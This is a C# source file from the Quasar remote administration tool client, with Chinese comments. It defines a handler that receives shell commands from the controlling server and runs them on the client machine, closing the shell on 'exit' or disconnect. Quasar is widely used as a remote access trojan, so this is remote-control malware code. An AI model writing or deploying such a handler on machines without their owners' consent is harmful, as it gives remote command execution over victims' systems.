﻿using Quasar.Client.IO;
using Quasar.Client.Networking;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// 处理与远程shell交互的消息。
    /// </summary>
    public class RemoteShellHandler : IMessageProcessor, IDisposable
    {
        /// <summary>
        /// 当前的远程shell实例。
        /// </summary>
        private Shell _shell;

        /// <summary>
        /// 与此远程shell处理器关联的客户端。
        /// </summary>
        private readonly QuasarClient _client;

        /// <summary>
        /// 使用给定客户端初始化 <see cref="RemoteShellHandler"/> 类的新实例。
        /// </summary>
        /// <param name="client">关联的客户端。</param>
        public RemoteShellHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        /// <summary>
        /// 处理客户端状态的变化。
        /// </summary>
        /// <param name="s">改变了状态的客户端。</param>
        /// <param name="connected">客户端的新连接状态。</param>
        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            // 在客户端断开连接时关闭shell
            if (!connected)
            {
                _shell?.Dispose();
            }
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoShellExecute;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShellExecute shellExec:
                    Execute(sender, shellExec);
                    break;
            }
        }

        private void Execute(ISender client, DoShellExecute message)
        {
            string input = message.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell(_client);

            if (input == "exit")
                _shell.Dispose();
            else
                _shell.ExecuteCommand(input);
        }

        /// <summary>
        /// 释放与此消息处理器关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _shell?.Dispose();
            }
        }
    }
}
